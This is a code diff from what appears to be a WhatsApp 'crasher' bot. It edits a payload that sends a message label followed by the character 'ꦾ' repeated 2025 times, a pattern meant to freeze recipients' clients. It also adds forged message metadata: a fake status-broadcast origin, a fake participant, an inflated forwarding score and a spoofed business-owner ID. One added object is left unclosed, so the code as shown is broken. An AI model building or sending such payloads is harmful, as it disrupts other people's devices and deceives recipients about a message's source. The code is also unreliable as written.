@@ -75,7 +75,7 @@ case "xvolz": {
         id: "©RexzSuki"
       },
       message: {
-        conversation: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞𝐫🕊️\n" + "ꦾ".repeat(2025)
+        conversation: "㑒 ⏤⃟𝐑͢𝐞⃔𝐱𝐳⃟𝐂͢𝐫⃔𝐚𝐬⃟𝐡⃔͢𝐞ʳ ཀ͜͡🕊️\n" + "ꦾ".repeat(2025)
       },
       pushName: "©RexzSuki"
     };
@@ -103,8 +103,13 @@ const locationMsg = proto.Message.LocationMessage.fromObject({
   accuracyInMeters: 252525,
   jpegThumbnail: null,
   contextInfo: {
+    remoteJid: "status@broadcast",
+    participant: "0@s.whatsapp.net",
+    stanzaId: "1234567890ABCDEF",
     forwardingScore: 252525,
     isForwarded: true,
+    businessMessageForwardInfo: {
+      businessOwnerJid: "13135550002@s.whatsapp.net"
     mentionedJid: mentionJid(),
     externalAdReply: {
       renderLargerThumbnail: true,
